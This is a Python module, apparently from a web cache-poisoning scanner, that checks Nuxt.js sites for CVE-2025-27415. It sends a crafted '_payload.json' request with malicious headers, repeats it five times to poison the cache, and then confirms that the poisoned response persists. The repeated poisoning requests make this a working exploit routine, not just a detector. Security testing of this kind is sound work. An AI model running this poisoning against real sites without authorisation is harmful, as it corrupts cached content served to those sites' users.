#!/usr/bin/env python3
"""
Based on Zhero research
https://zhero-web-sec.github.io/research-and-things/nuxt-show-me-your-payload
"""

from urllib.parse import urljoin
from modules.cp_cve.unrisk_page import get_unrisk_page
from utils.style import Colors, Identify
from utils.utils import configure_logger, requests

logger = configure_logger(__name__)

# Status codes à exclure des détections par status différent
EXCLUDED_STATUS_CODES = {401, 403, 404, 429, 500, 503}


def is_json_response(response: requests.Response) -> bool:
    """
    Vérifie si une réponse est du JSON (par Content-Type d'abord, puis parsing)
    """
    if "application/json" in response.headers.get("Content-Type", ""):
        return True
    try:
        response.json()
        return True
    except ValueError:
        return False


def build_payload_url(base_url: str) -> str:
    """
    Construit l'URL du payload Nuxt.js via urljoin
    """
    return urljoin(base_url.rstrip("/") + "/", "?/_payload.json")
    

def test_nuxt_poisoning(
    poison_url: str,
    req_baseline: requests.Response,
    s: requests.Session,
    custom_header: dict,
    authent: tuple[str, str] | None,
) -> tuple[bool, str]:
    """
    Teste l'empoisonnement du cache Nuxt.js

    Args:
        poison_url: URL du _payload.json
        req_baseline: Réponse baseline déjà effectuée (réutilisée)
        s: Session requests
        custom_header: Headers malveillants
        authent: Credentials optionnels

    Returns:
        Tuple (is_vulnerable, detection_type)
    """
    req_poison = s.get(
        poison_url,
        verify=False,
        auth=authent,
        headers=custom_header,
        timeout=10,
        allow_redirects=False,
    )

    # Détection 1: Réponse JSON sur _payload.json
    if is_json_response(req_poison):
        return (True, "JSON_RESPONSE")

    # Détection 2: Status code différent et non exclu
    if (
        req_poison.status_code != req_baseline.status_code
        and req_poison.status_code not in EXCLUDED_STATUS_CODES
    ):
        return (
            True,
            f"DIFFERENT_STATUS {req_baseline.status_code} > {req_poison.status_code}",
        )

    return (False, "NO_DETECTION")


def verify_cache_persistence(
    poison_url: str,
    s: requests.Session,
    authent: tuple[str, str] | None,
) -> tuple[bool, str]:
    """
    Vérifie la persistence du cache empoisonné SANS header malveillant

    Args:
        poison_url: URL du _payload.json à vérifier
        s: Session requests
        authent: Credentials optionnels

    Returns:
        Tuple (is_persisted, detection_type)
    """
    # Requête propre — aucun header malveillant
    req_verify = s.get(
        poison_url,
        verify=False,
        auth=authent,
        timeout=10,
        allow_redirects=False,
    )

    if is_json_response(req_verify):
        return (True, "CACHE_POISONED_JSON")

    return (False, "NO_PERSISTENCE")


def nuxt_check(
    url: str,
    s: requests.Session,
    req_main: requests.Response,
    custom_header: dict,
    authent: tuple[str, str] | None,
) -> bool:
    """
    Vérifie la vulnérabilité CVE-2025-27415 (Nuxt.js _payload.json cache poisoning)
    """
    try:
        unrisk_page = get_unrisk_page(url, s, req_main)

        if not unrisk_page:
            print(
                " └─ [i] [CVE-2025-27415] Seems Nuxt.js framework is used,"
                " but no risk-free pages found. Manual check required."
            )
            return False

        poison_url = build_payload_url(unrisk_page)

        # Baseline unique — réutilisée dans test_nuxt_poisoning
        req_baseline = s.get(
            unrisk_page, verify=False, auth=authent,
            timeout=10, allow_redirects=False,
        )

        is_vulnerable, detection_type = test_nuxt_poisoning(
            poison_url, req_baseline, s, custom_header, authent
        )

        if not is_vulnerable:
            return False

        print(
            f" {Identify.behavior} | CVE-2025-27415 | {detection_type}"
            f" | {Colors.BLUE}{poison_url}{Colors.RESET}"
        )

        # Empoisonnement avec gestion d'erreur
        for _ in range(5):
            try:
                s.get(poison_url, verify=False, auth=authent,
                      headers=custom_header, timeout=10, allow_redirects=False)
            except requests.exceptions.RequestException as e:
                logger.error("poison request failed %s: %s", poison_url, e)
                break

        # Vérification de persistence SANS header malveillant
        is_persisted, persist_type = verify_cache_persistence(
            poison_url, s, authent
        )

        if is_persisted:
            print(
                f" {Identify.confirmed} | CVE-2025-27415 | {persist_type}"
                f" | {Colors.BLUE}{poison_url}{Colors.RESET}"
            )
            return True

        print(" └─ [i] Vulnerability detected but cache not persistently poisoned")
        return False

    except requests.exceptions.Timeout:
        logger.error("request timeout %s", url)
    except requests.exceptions.ConnectionError as e:
        logger.error("connection error %s: %s", url, e)
    except Exception as e:
        logger.error("error checking CVE-2025-27415 %s: %s", url, e)

    return False